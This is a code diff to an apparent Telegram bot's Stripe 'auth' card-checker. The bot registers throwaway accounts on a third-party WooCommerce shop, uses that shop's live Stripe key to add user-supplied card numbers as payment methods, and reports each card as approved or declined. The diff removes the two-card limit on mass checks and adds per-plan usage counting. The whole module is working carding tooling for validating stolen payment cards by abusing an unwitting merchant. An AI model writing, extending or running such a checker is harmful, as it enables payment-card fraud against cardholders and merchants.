@@ -13,7 +13,7 @@ from shared import (
     PLANS, get_user_plan, is_user_banned,
     get_user_session, increment_gate_usage,
     can_user_use_command, update_user_cooldown,
-    get_gate_usage_count
+    get_gate_usage_count, increment_mass_check_usage
 )
 
 class StripeAuthChecker:
@@ -25,7 +25,7 @@ class StripeAuthChecker:
         self.request_timeout = 35.0
         self.base_url = "https://simonapouchescy.com"
         self.stripe_key = "pk_live_51I6wp3COExl9jV4CcKbaN3EFxcAB50pTrNUO8OPoGViHyLMPXUBRLDgqu1kYLj1nLkW24fENgejrjKvodrvFaTBY00cQmieKcs"
-
+        
         self.bin_services = [
             {
                 'url': 'https://lookup.binlist.net/{bin}',
@@ -88,7 +88,7 @@ class StripeAuthChecker:
                 'country': 'N/A',
                 'country_code': 'N/A'
             }
-
+            
         bin_number = cc[:6]
 
         if bin_number in self.bin_cache:
@@ -135,7 +135,7 @@ class StripeAuthChecker:
             bin_info = await self.get_bin_info(cc)
 
         status_emoji = "✅" if "APPROVED" in status else "❌"
-
+        
         return (
             f"╔═✦✧✦═╦═✦✧✦═╦═✦✧✦═╗\n"
             f"⚡ 𝓢𝓽𝓻𝓲𝓹𝓮 𝓐𝓾𝓽𝓱 𝓒𝓱𝓮𝓬𝓴\n"
@@ -204,7 +204,7 @@ class StripeAuthChecker:
             print("Step 4: Getting payment page nonce...")
             payment_url = f"{self.base_url}/my-account-2/add-payment-method/"
             payment_response = await client.get(payment_url)
-
+            
             if payment_response.status_code != 200:
                 await client.aclose()
                 return None, None, f"Payment page failed: {payment_response.status_code}"
@@ -258,7 +258,7 @@ class StripeAuthChecker:
             # Extract registration nonce
             reg_nonce_pattern = r'name="woocommerce-register-nonce" value="([a-f0-9]{10})"'
             reg_nonce_match = re.search(reg_nonce_pattern, reg_text)
-
+            
             if not reg_nonce_match:
                 print("Registration nonce not found")
                 return False
@@ -307,7 +307,7 @@ class StripeAuthChecker:
             }
 
             response = await client.post(reg_url, data=reg_data, headers=headers, follow_redirects=True)
-
+            
             # Check if registration was successful
             if response.status_code in [200, 302]:
                 # Check if we got logged in cookies
@@ -375,7 +375,7 @@ class StripeAuthChecker:
 
             # Generate random session IDs
             client_session_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=36))
-
+            
             stripe_data = {
                 'type': 'card',
                 'card[number]': cc,
@@ -404,7 +404,7 @@ class StripeAuthChecker:
 
             print("Creating Stripe payment method...")
             stripe_response = await client.post(stripe_url, headers=stripe_headers, data=stripe_data)
-
+            
             if stripe_response.status_code != 200:
                 error_text = stripe_response.text[:100] if stripe_response.text else "No response"
                 bin_info = await self.get_bin_info(cc)
@@ -453,12 +453,12 @@ class StripeAuthChecker:
 
             print("Sending AJAX request to confirm setup intent...")
             ajax_response = await client.post(ajax_url, headers=ajax_headers, data=ajax_data)
-
+            
             # Close client
             await client.aclose()
 
             print(f"AJAX Response status: {ajax_response.status_code}")
-
+            
             if ajax_response.status_code != 200:
                 # Try to get error details
                 error_detail = "Bad Request"
@@ -469,21 +469,21 @@ class StripeAuthChecker:
                             error_detail = error_json['data']['message']
                 except:
                     pass
-
+                    
                 bin_info = await self.get_bin_info(cc)
                 return await self.format_response(cc, mes, ano, cvv, "DECLINED", f"AJAX Error: {error_detail}", username, time.time()-start_time, bin_info)
 
             try:
                 result = ajax_response.json()
                 print(f"AJAX Response: {result}")
-
+                
                 if result.get("success"):
                     bin_info = await self.get_bin_info(cc)
                     return await self.format_response(cc, mes, ano, cvv, "APPROVED", "Successful", username, time.time()-start_time, bin_info)
                 else:
                     error_data = result.get("data", {})
                     error_message = "Transaction Declined"
-
+                    
                     # Extract detailed error message
                     if isinstance(error_data, dict):
                         if "error" in error_data:
@@ -496,7 +496,7 @@ class StripeAuthChecker:
                             error_message = error_data["message"]
                     elif isinstance(error_data, str):
                         error_message = error_data
-
+                    
                     bin_info = await self.get_bin_info(cc)
                     return await self.format_response(cc, mes, ano, cvv, "DECLINED", error_message, username, time.time()-start_time, bin_info)
 
@@ -565,7 +565,7 @@ async def handle_stripe_auth(event):
         update_user_cooldown(user_id)
 
         await processing_msg.edit(result)
-
+        
     except Exception as e:
         error_msg = str(e)[:150]
         await event.respond(f"❌ Bot error in /au command: {error_msg}")
@@ -579,7 +579,7 @@ async def handle_mass_stripe_auth(event):
 
         args = event.message.text.split('\n')
         if len(args) < 2:
-            await event.respond("❗Please provide card details in format (max 2 cards):\n"
+            await event.respond("❗Please provide card details in format:\n"
                                "`/mau`\n"
                                "`cc|mm|yy|cvv`\n"
                                "`cc|mm|yy|cvv`\n"
@@ -589,20 +589,21 @@ async def handle_mass_stripe_auth(event):
         username = event.sender.username or str(user_id)
         user_plan = get_user_plan(user_id)
 
-        # Check usage limits - pass is_gate_command=True for /mau command
-        can_use, reason = can_user_use_command(user_id, event.is_group, is_gate_command=True)
+        card_list = [card.strip() for card in args[1:] if card.strip()]
+        card_count = len(card_list)
+
+        # Check mass check usage limits
+        can_use, reason = can_user_use_command(user_id, event.is_group, is_gate_command=True, is_mass_check=True, card_count=card_count)
         if not can_use:
             await event.respond(reason)
             return
 
+        # Update mass check usage (only for non-GOD users)
+        if user_plan != "GOD":
+            increment_mass_check_usage(user_id)
+
         session = get_user_session(user_id)
         checker = StripeAuthChecker(session)
-
-        card_list = [card.strip() for card in args[1:] if card.strip()]
-
-        if len(card_list) > 2:
-            await event.respond("❌ Maximum 2 cards allowed per mass request.")
-            return
 
         processing_msg = await event.respond("🔄 Starting mass Stripe auth check...")
 
@@ -645,14 +646,14 @@ async def handle_mass_stripe_auth(event):
 
         response = f"🔍 **Mass Stripe Auth Results**\n"
         response += f"✅ Approved: {successful} | ❌ Declined: {failed}\n\n"
-
+        
         for i, result in enumerate(results):
             response += f"**Card {i+1}:**\n{result}\n\n"
 
         response += f"📊 Total: {len(card_list)} | Checked by: @{username}"
 
         await processing_msg.edit(response)
-
+        
     except Exception as e:
         error_msg = str(e)[:150]
         await event.respond(f"❌ Bot error in /mau command: {error_msg}")
